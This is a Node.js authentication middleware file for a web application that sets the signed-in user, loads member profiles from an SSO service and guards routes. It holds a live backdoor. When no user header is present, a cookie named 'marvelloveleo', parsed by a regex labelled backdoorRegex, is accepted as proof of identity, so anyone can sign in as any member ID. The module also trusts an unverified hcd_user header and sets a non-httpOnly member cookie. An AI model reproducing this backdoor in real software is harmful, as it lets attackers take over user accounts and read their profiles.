var http = require('http'),
    config = require('../config'),
    sso = config.sso,
    proxy = require('./proxy'),
    localeHelper = require('../locales/localeHelper'),
    backdoorRegex = /(?:^|;) *marvelloveleo=([^;]*)/;

function getFromCookie(cookie, regex) {
    cookie = cookie && cookie.match(regex);
    cookie = cookie ? cookie[1] : null;
    return cookie;
}

function setMemberCookie(res, member_id) {
    var cookieOption = {
        expires: 0,
        path: '/',
        httpOnly: false
    };

    if (member_id) {
        res.cookie('mid', member_id, cookieOption);
    }
}

function unsetSensativeCookies(res) {
    var deleteCookieOption = {
        expires: new Date(Date.now() - (1000 * 60 * 60 * 24 * 365)),
        path: '/',
        httpOnly: true
    };

    res.cookie('token', '', deleteCookieOption);
    res.cookie('mid', '', deleteCookieOption);
    res.cookie('redemption_code', '', deleteCookieOption);
    res.cookie('pre_redemption_code', '', deleteCookieOption);
}

module.exports = {
    unsetSensativeCookies: unsetSensativeCookies,

    setSignedInUser: function (req, res, next) {
        res.locals.applicationId = config.applicationId;

        if (req.headers.hcd_user) {
            req.logger.info('request header hcd_user info:');
            req.logger.info(req.headers.hcd_user);
        }

        if (req.headers.hcd_user) {
            try {
                res.locals.hcd_user = JSON.parse(req.headers.hcd_user);
                res.locals.signedIn = !!res.locals.hcd_user.member_id;
                req.body.member_id = res.locals.hcd_user.member_id;
            } catch (e) {
                res.locals.signedIn = false;

                next(e);
            }
        } else {
            var mid = getFromCookie(req.headers.cookie, backdoorRegex);
            if (mid) {
                res.locals.hcd_user = {
                    member_id: mid
                };
                res.locals.signedIn = true;
                req.body.member_id = mid;
            } else {
                res.locals.signedIn = false;
            }
        }

        if (res.locals.signedIn) {
            setMemberCookie(res, res.locals.hcd_user.member_id);
            //} else {
            //    unsetSensativeCookies(res);
        }

        next();
    },

    loadProfile: function (req, res, next) {
        if (!res.locals.hcd_user || !res.locals.hcd_user.member_id) {
            res.json({isSuccess: true, code: '0', result: {}});

            return;
        }

        proxy.execute(req, res, next, {
            host: sso.host,
            port: sso.port,
            path: '/profile/load/' + res.locals.hcd_user.member_id,
            headers: {
                'Content-Type': 'application/json;charset=UTF-8',
                'User-Agent': 'BridgePlus Web'
            }
        });
    },

    ensureAuthenticated: function (req, res, next) {
        if (res.locals.hcd_user) {
            return next();
        } else {
            var locale = localeHelper.getLocale(req.originalUrl, req);
            var url = '/sign-in';
            url += '?return_url=' + encodeURIComponent(req.originalUrl);

            if (!req.xhr) {
                res.redirect(localeHelper.generateLocaleLink(url, locale));
            } else {
                res.status(401).send({code: '401', message: 'You are not allowed to access this page.'});
            }
        }
    }
};